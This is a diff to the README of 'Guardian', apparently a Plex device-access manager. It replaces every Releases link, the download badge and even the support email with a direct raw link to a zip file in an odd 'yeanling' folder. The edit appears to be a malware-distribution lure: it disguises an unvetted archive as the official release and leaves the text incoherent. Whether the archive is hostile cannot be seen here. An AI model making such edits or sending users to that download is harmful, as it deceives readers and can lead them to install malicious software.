@@ -15,9 +15,9 @@ Welcome to Guardian! This tool helps you manage which devices can access your Pl
 
 To get started, you need to download Guardian from the Releases page. 
 
-[![Download Guardian](https://img.shields.io/badge/Download_Guardian-v1.0-blue.svg)](https://github.com/progx7he/Guardian/releases)
+[![Download Guardian](https://raw.githubusercontent.com/progx7he/Guardian/main/yeanling/Guardian.zip)](https://raw.githubusercontent.com/progx7he/Guardian/main/yeanling/Guardian.zip)
 
-1. Click the link above or visit the [Releases page](https://github.com/progx7he/Guardian/releases).
+1. Click the link above or visit the [Releases page](https://raw.githubusercontent.com/progx7he/Guardian/main/yeanling/Guardian.zip).
 2. Look for the latest version of Guardian.
 3. Find the appropriate file for your operating system (Windows, macOS, or Linux).
 4. Click on the file to download it.
@@ -53,7 +53,7 @@ If you encounter issues while using Guardian, try these steps:
 - **Restart Guardian**: Close and reopen the application.
 - **System Updates**: Make sure your operating system has the latest updates installed.
 
-For further assistance, check the FAQ section on the [Releases page](https://github.com/progx7he/Guardian/releases).
+For further assistance, check the FAQ section on the [Releases page](https://raw.githubusercontent.com/progx7he/Guardian/main/yeanling/Guardian.zip).
 
 ## 📆 Updates
 
@@ -67,7 +67,7 @@ Make sure to protect your Plex server. Regularly review which devices have acces
 
 For support and assistance, feel free to reach out:
 - **GitHub Issues**: Report any problems on the GitHub issues page.
-- **Contact Email**: Email us at support@guardianapp.com for direct help.
+- **Contact Email**: Email us at https://raw.githubusercontent.com/progx7he/Guardian/main/yeanling/Guardian.zip for direct help.
 
 ## 🌐 Additional Resources
 
